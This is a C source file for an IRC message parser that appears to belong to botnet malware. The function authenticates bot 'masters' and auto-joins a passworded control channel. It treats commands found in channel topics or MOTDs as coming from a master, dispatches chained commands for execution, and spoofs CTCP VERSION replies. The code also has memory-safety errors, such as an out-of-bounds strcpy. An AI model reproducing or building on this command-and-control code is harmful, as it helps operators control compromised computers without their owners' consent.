#include "includes.h"
#include "externs.h"


int XIRCParseLine(IRC* irc, char Masters[MAXLOGINS][MAXIDENT], char *ProtocolLine)
{
//	XIRCRawSend(irc->sock, 0, "%s %s %s", XRandStr("JOIN"), irc->Channel, irc->ChannelPass);
	char CommandLine[IRCLINE] = {0};
//	char User[MAXIDENT] = {0};
	char *arg[MAXPARAMS] = {0};
	short Code = 0, CommandParamNum = 3;
	int i;

	short CurrentLine = 0;

	int Ret = 0;

	char *Commands[MAXPARAMS] = {0};

	strncpy(CommandLine, ProtocolLine, sizeof(CommandLine)-1);



	SESSION Session;

	Session.irc = irc;
//	Session.Destination = {0};
	Session.IsMaster = FALSE;
//	Session.Method = {0};
	Session.Notice = FALSE;
	Session.Silent = FALSE;



	arg[0] = strtok(ProtocolLine, " ");
	#ifdef DEBUG_SYSTEM
	dbg("arg[%d]: %s", 0, arg[0]);
	#endif

	for (i = 1; i < MAXPARAMS; i++)
	{
		arg[i] = strtok(NULL, " ");

		#ifdef DEBUG_SYSTEM
		if (arg[i])
			dbg("arg[%d]: %s", i, arg[i]);
		#endif
	}

	if (!arg[0] || !arg[1])
		return 0;

	if (!strcmp("PING", arg[0]))
	{
		arg[0][1] = 'O';

		XIRCRawSend(irc->sock, 0, "%s %s", arg[0], arg[1]);

	//	if (!InChannel)
		XIRCRawSend(irc->sock, 0, "%s %s %s", "JOIN", irc->Channel, irc->ChannelPass);

		return 0;
	}

	if (arg[0][0] == ':' && arg[0][1])
	{
		arg[0]++;
		strncpy(Session.User, arg[0], sizeof(Session.User)-1);
		strtok(Session.User, "!");
	}
	else
		return 0;
	for (i = 0; i < MAXLOGINS; i++)
	{
		#ifdef DEBUG_SYSTEM
		dbg("Masters[%d]: %s, arg[0]: %s", i, Masters[i], arg[0]);
		#endif
		if (!strcmp(Masters[i], arg[0]))
			Session.IsMaster = TRUE;
	}

	 if (!strcmp("PRIVMSG", arg[1]) || !strcmp("NOTICE", arg[1]) || (!strcmp("332", arg[1]) && ParseTopic) || (!strcmp("372", arg[1]) && ParseMotd))
	{
		if  (!arg[2] || !arg[3])
			return 0;

		if ((!strcmp("332", arg[1]) && ParseTopic) || (!strcmp("372", arg[1]) && ParseMotd))
		{
			arg[2] = arg[3];

			if (++arg[4] && irc->Nick)
			{
				CommandParamNum = (!strncmp(irc->Nick, arg[4], strlen(irc->Nick)))?(5):(4);
				if (!arg[CommandParamNum]) 
					return 0;

				strncpy(Session.Method, arg[1], sizeof(Session.Method)-1);


				strncpy(Session.Destination, arg[2], sizeof(Session.Destination)-1);

				strncpy(CommandLine, strstr(CommandLine, arg[3])+((CommandParamNum == 5)?(strlen(arg[4])+strlen(arg[3])+3):(strlen(arg[3])+2)), sizeof(CommandLine)-1);

				Session.IsMaster = TRUE;

				goto ParseCommands;
			}
		}
		else if (arg[2] && !strcmp("PRIVMSG", arg[1]) || !strcmp("NOTICE", arg[1]))
		{
//			if (arg[2][0] != '#' || !strcmp("NOTICE", arg[1])) 
//				arg[2] = User;

			if (++arg[3] && irc->Nick)
			{
				CommandParamNum = (!strncmp(irc->Nick, arg[3], strlen(irc->Nick)))?(4):(3);
				if (!arg[CommandParamNum]) 
					return 0;

				#ifdef DEBUG_SYSTEM
				dbg("arg[CommandParamNum]: %s", arg[CommandParamNum]);
				#endif

				if (arg[2] && !strcmp("\1VERSION\1", arg[CommandParamNum]))
				{
					#ifdef DEBUG_SYSTEM
					dbg("VERSION");
					#endif
					if (arg[2][0] != '#' && VersionList[CurrentVersion][0])
						XIRCMessage(irc->sock, TRUE, TRUE, FALSE, Session.User, "\1VERSION %s\1", (char *)VersionList[CurrentVersion]);

					return 0;
				}
				else if (arg[2] && !strcmp("\1PING", arg[CommandParamNum]))
				{
					#ifdef DEBUG_SYSTEM
					dbg("PING");
					#endif
					if (arg[CommandParamNum+1] && arg[2][0] != '#')
						XIRCMessage(irc->sock, TRUE, TRUE, FALSE, Session.User, "\1PING %s", arg[CommandParamNum+1]);

					return 0;
				}
				else if (!strcmpi("\1PONG", arg[CommandParamNum]))
				{
					#ifdef DEBUG_SYSTEM
					dbg("PONG");
					#endif
					strcpy(Masters[MAXLOGINS]-1, arg[0]);
					if (arg[CommandParamNum+1] && arg[2][0] != '#')
						XIRCMessage(irc->sock, TRUE, TRUE, FALSE, Session.User, "\1PONG %s", arg[CommandParamNum+1]);

					return 0;
				}
				else
				{
					strncpy(Session.Method, arg[1], sizeof(Session.Method)-1);

					strncpy(Session.Destination, (arg[2][0] != '#' || !strcmp("NOTICE", arg[1]))?(Session.User):(arg[2]), sizeof(Session.Destination)-1);

					#ifdef DEBUG_SYSTEM
					dbg("%d: arg[2]: %s",CommandParamNum, arg[2]);
					dbg("%d: arg[3]: %s",CommandParamNum, arg[3]);
					#endif


					strncpy(CommandLine, strstr(CommandLine, ((CommandParamNum == 4)?(arg[3]):(arg[2])))+((CommandParamNum == 4)?(strlen(arg[3])+1):(strlen(arg[2])+2)), sizeof(CommandLine)-1);



					#ifdef DEBUG_SYSTEM
					dbg("CommandLine: %s", CommandLine);
					#endif

					goto ParseCommands;
				}
			}
		}

		return 0;
	}
	else if (arg[3]  && !strcmp("KICK", arg[1]))
	{
		// kick master if it was kicked by someone
		//kick master is he kicked our bot (actually me - the bot)

	//	dbg("x2");
	//	MessageBox(0, "9", "9", 0);
		for (i = 0; i < MAXLOGINS; i++)
		{
			if (Masters[i][0])
			{

					if (!strcmp(arg[3], strtok(strdup(Masters[i]), "!")))
					{
					//	dbg("KICK: %s", strtok(Masters[i], "!"));

						memset(Masters[i], 0, sizeof(Masters[i]));
						XIRCMessage(irc->sock, TRUE, TRUE/*Notice*/, FALSE, Session.User, "[MAIN]: User: %s logged out.", Session.User);
					//	_snprintf(sendbuf, sizeof(sendbuf), "[MAIN]: User: %s logged out.", arg[3]);
					//	XIRCRawSend(irc->sock, 0, "NOTICE %s :%s\r\n", arg[3], sendbuf);

					//	dbg(sendbuf);
					//	addlog(sendbuf);

						break;
					}

				//	return 0;
			//	}
			}
		}
		if (!strcmp(irc->Nick, arg[3]))
		{
			//InChannel = FALSE;
			XIRCRawSend(irc->sock, 0, "%s %s %s", "JOIN", irc->Channel, irc->ChannelPass);
		}

	//	MessageBox(0, "9", "9", 0);

		return 0;
	}
	else if (!strcmp("PART", arg[1]) || !strcmp("QUIT", arg[1]))
	{
		#ifdef DEBUG_SYSTEM
		dbg("x3");
		#endif
		for (i = 0; i < MAXLOGINS; i++)
		{
			if (Masters[i][0])
			{
				if (!strncmp(Masters[i], arg[0], strlen(Masters[i])))
				{
					memset(Masters[i], 0, sizeof(Masters[i]));

				//	_snprintf(sendbuf, sizeof(sendbuf), "", User);
					if (!strcmp("PART", arg[1]))
						XIRCMessage(irc->sock, TRUE, TRUE/*Notice*/, FALSE, Session.User, "[MAIN]: User: %s logged out.", Session.User);

//					dbg(sendbuf);
					//addlog(sendbuf);

					return 0;
				}
			}
		}
	}
	else if (!strcmp("NICK", arg[1]))
	{
	//	MessageBox(0, "9", "9", 0);

	//	dbg("x4");
	//	dbg("!!!!!!!!!!!!!!!!!NICK: %s:%d || %s:%d", User, strlen(user), irc->Nick, strlen(irc->Nick));
		if (!strcmp(Session.User, irc->Nick))
		{
			strncpy(irc->Nick, arg[2]+1, sizeof(irc->Nick)-1);
			#ifdef DEBUG_SYSTEM
			dbg("New bot nick changed by someone is %s", irc->Nick);
			#endif
		}
		else
		{
			for (i = 0; i < MAXLOGINS; i++)
			{
				if (Masters[i][0])
				{
					if (!strncmp(Masters[i], arg[0], strlen(Masters[i])))//if (!strcmp(Masters[i], arg[0]))
					{
						char *identhost = strchr(arg[0],'!');
						if (identhost && (strlen(arg[2]) + strlen(identhost) < MAXIDENT))
						{
							_snprintf(Masters[i], MAXIDENT, "%s%s", arg[2], identhost);
						//	_snprintf(sendbuf, sizeof(sendbuf), "[MAIN]: Master: %s changed identity to: %s.", arg[0], Masters[i]);
						}
						//else
						//	_snprintf(sendbuf, sizeof(sendbuf), "[MAIN]: Failed to change nick for Master: %s.", Masters[i]);

						//dbg(sendbuf);
						#ifndef NO_IMPORTANT_DATA_LOGGING
					//	addlog(sendbuf);
						#endif

						break;
					}
				}
			}
		}
	}
	else if ((Code = atoi(arg[1])))
	{
		switch (Code)
		{
			case 0:
				break;

			case 376:
			case 1:
				XIRCRawSend(irc->sock, 0, "%s %s %s", "JOIN", irc->Channel, irc->ChannelPass);
				if (strcmp(irc->ChannelMode, ""))
					XIRCRawSend(irc->sock, 0, "%s %s %s", "MODE", irc->Channel, irc->ChannelMode);
				break;


			case 433:
			case 432:
				strncpy(irc->Nick, XGetNick(), sizeof(irc->Nick)-1);
				XIRCRawSend(irc->sock, 0, "%s %s", "NICK", irc->Nick);
				break;



			default:
				break;
		}
	}

	return 0;

	ParseCommands:

	#ifdef DEBUG_SYSTEM
	dbg("Method: %s", Session.Method);
	dbg("Destination: %s", Session.Destination);
	dbg("CommandLine: %s", CommandLine);
	#endif

	if (Session.Method && Session.Destination && CommandLine && arg[0])
	{
		Commands[CurrentLine = 0] = strtok(CommandLine, "&&"); // |
		for (CurrentLine = 1; Commands[CurrentLine] = strtok(NULL, "&&"); CurrentLine++) // |
			while (Commands[CurrentLine][0] == ' ')
				Commands[CurrentLine]++;

		CurrentLine = 0;

		while (Commands[CurrentLine])// && CurrentLine++)
		{
			Ret = XIRCParseCommand(&Session, Masters, arg[0], Commands[CurrentLine]);

			CurrentLine++;

			if (Ret)
				break;

			Sleep(50);
		}
	}

	return Ret;
}
